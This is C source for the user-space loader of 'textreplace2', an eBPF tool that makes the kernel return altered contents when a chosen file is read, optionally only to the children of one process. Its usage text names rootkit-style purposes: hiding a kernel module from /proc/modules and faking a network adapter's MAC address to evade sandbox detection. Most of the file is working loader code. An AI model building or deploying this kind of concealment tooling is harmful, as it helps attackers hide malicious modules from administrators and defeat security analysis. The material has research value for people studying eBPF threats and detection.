// SPDX-License-Identifier: BSD-3-Clause
#include <argp.h>
#include <unistd.h>
#include "textreplace2.skel.h"
#define BAD_BPF_USE_TRACE_PIPE
#include "common_um.h"
#include "common.h"

// Setup Argument stuff
static struct env {
    char filename[FILENAME_LEN_MAX];
    char input[FILENAME_LEN_MAX];
    char replace[FILENAME_LEN_MAX];
    int target_ppid;
} env;

const char *argp_program_version = "textreplace2 1.0";
const char *argp_program_bug_address = "<path@tofile.dev>";
const char argp_program_doc[] =
"Text Replace\n"
"\n"
"Replaces text in a file.\n"
"To pass in newlines use \%'\\n' e.g.:\n"
"    ./textreplace2 -f /proc/modules -i ppdev -r $'aaaa\\n'"
"\n"
"USAGE: ./textreplace2 -f filename -i input -r output [-t 1111]\n"
"EXAMPLES:\n"
"Hide kernel module:\n"
"  ./textreplace2 -f /proc/modules -i 'joydev' -r 'cryptd'\n"
"Fake Ethernet adapter (used in sandbox detection):  \n"
"  ./textreplace2 -f /sys/class/net/eth0/address -i '00:15:5d:01:ca:05' -r '00:00:00:00:00:00'  \n"
"";

static const struct argp_option opts[] = {
    { "filename", 'f', "FILENAME", 0, "Path to file to replace text in" },
    { "input", 'i', "INPUT", 0, "Text to be replaced in file, max 20 chars" },
    { "replace", 'r', "REPLACE", 0, "Text to replace with in file, must be same size as -t" },
    { "target-ppid", 't', "PPID", 0, "Optional Parent PID, will only affect its children." },
    {},
};
static error_t parse_arg(int key, char *arg, struct argp_state *state)
{
    switch (key) {
    case 'i':
        if (strlen(arg) >= TEXT_LEN_MAX) {
            fprintf(stderr, "Text must be less than %d characters\n", FILENAME_LEN_MAX);
            argp_usage(state);
        }
        strncpy(env.input, arg, sizeof(env.input));
        break;
    case 'r':
        if (strlen(arg) >= TEXT_LEN_MAX) {
            fprintf(stderr, "Text must be less than %d characters\n", FILENAME_LEN_MAX);
            argp_usage(state);
        }
        strncpy(env.replace, arg, sizeof(env.replace));
        break;
    case 'f':
        if (strlen(arg) >= FILENAME_LEN_MAX) {
            fprintf(stderr, "Filename must be less than %d characters\n", FILENAME_LEN_MAX);
            argp_usage(state);
        }
        strncpy(env.filename, arg, sizeof(env.filename));
        break;
    case 't':
        errno = 0;
        env.target_ppid = strtol(arg, NULL, 10);
        if (errno || env.target_ppid <= 0) {
            fprintf(stderr, "Invalid pid: %s\n", arg);
            argp_usage(state);
        }
        break;
    case ARGP_KEY_ARG:
        argp_usage(state);
        break;
    default:
        return ARGP_ERR_UNKNOWN;
    }
    return 0;
}
static const struct argp argp = {
    .options = opts,
    .parser = parse_arg,
    .doc = argp_program_doc,
};

static int handle_event(void *ctx, void *data, size_t data_sz)
{
    const struct event *e = data;
    if (e->success)
        printf("Replaced text in PID %d (%s)\n", e->pid, e->comm);
    else
        printf("Failed to replace text in PID %d (%s)\n", e->pid, e->comm);
    return 0;
}

static void pin_stuff(struct textreplace2_bpf *skel) {

    
}

int main(int argc, char **argv)
{
    struct ring_buffer *rb = NULL;
    struct textreplace2_bpf *skel;
    int err;
    int index;
    // Parse command line arguments
    err = argp_parse(&argp, argc, argv, 0, NULL, NULL);
    if (err) {
        return err;
    }
    if (env.filename[0] == '\x00' || env.input[0] == '\x00' || env.replace[0] == '\x00') {
        printf("ERROR: filename, input, and replace all requried, see %s --help\n", argv[0]);
        exit(1);
    }
    if (strlen(env.input) != strlen(env.replace)) {
        printf("ERROR: input and replace text must be the same length\n");
        exit(1);
    }

    // Do common setup
    if (!setup()) {
        exit(1);
    }

    // Open BPF application 
    skel = textreplace2_bpf__open();
    if (!skel) {
        fprintf(stderr, "Failed to open BPF program: %s\n", strerror(errno));
        return 1;
    }

    // Verify and load program
    err = textreplace2_bpf__load(skel);
	if (err) {
		fprintf(stderr, "Failed to load and verify BPF skeleton\n");
		goto cleanup;
	}

    struct tr_file file;
    strncpy(file.filename, env.filename, sizeof(file.filename));
    index = PROG_00;
    file.filename_len = strlen(env.filename);
    err = bpf_map_update_elem(
        bpf_map__fd(skel->maps.map_filename),
        &index,
        &file,
        BPF_ANY
    );
    if (err == -1) {
        printf("Failed to add filename to map? %s\n", strerror(errno));
        goto cleanup;
    }

    struct tr_text text;
    strncpy(text.text, env.input, sizeof(text.text));
    index = PROG_00;
    text.text_len = strlen(env.input);
    err = bpf_map_update_elem(
        bpf_map__fd(skel->maps.map_text),
        &index,
        &text,
        BPF_ANY
    );
    if (err == -1) {
        printf("Failed to add text input to map? %s\n", strerror(errno));
        goto cleanup;
    }
    strncpy(text.text, env.replace, sizeof(text.text));
    index = PROG_01;
    text.text_len = strlen(env.replace);
    err = bpf_map_update_elem(
        bpf_map__fd(skel->maps.map_text),
        &index,
        &text,
        BPF_ANY
    );
    if (err == -1) {
        printf("Failed to add text replace to map? %s\n", strerror(errno));
        goto cleanup;
    }

    // Add program to map so we can call it later
    index = PROG_01;
    int prog_fd = bpf_program__fd(skel->progs.check_possible_addresses);
    err = bpf_map_update_elem(
        bpf_map__fd(skel->maps.map_prog_array),
        &index,
        &prog_fd,
        BPF_ANY);
    if (err == -1) {
        printf("Failed to add program to prog array! %s\n", strerror(errno));
        goto cleanup;
    }
    index = PROG_02;
    prog_fd = bpf_program__fd(skel->progs.overwrite_addresses);
    err = bpf_map_update_elem(
        bpf_map__fd(skel->maps.map_prog_array),
        &index,
        &prog_fd,
        BPF_ANY);
    if (err == -1) {
        printf("Failed to add program to prog array! %s\n", strerror(errno));
        goto cleanup;
    }

    // Attach tracepoint handler 
    err = textreplace2_bpf__attach( skel);
    if (err) {
        fprintf(stderr, "Failed to attach BPF program: %s\n", strerror(errno));
        goto cleanup;
    }

    // Set up ring buffer
    rb = ring_buffer__new(bpf_map__fd( skel->maps.rb), handle_event, NULL, NULL);
    if (!rb) {
        err = -1;
        fprintf(stderr, "Failed to create ring buffer\n");
        goto cleanup;
    }

    printf("Successfully started!\n");
    read_trace_pipe();
    while (!exiting) {
        err = ring_buffer__poll(rb, 100 /* timeout, ms */);
        /* Ctrl-C will cause -EINTR */
        if (err == -EINTR) {
            err = 0;
            break;
        }
        if (err < 0) {
            printf("Error polling perf buffer: %d\n", err);
            break;
        }
    }

cleanup:
    textreplace2_bpf__destroy( skel);
    return -err;
}
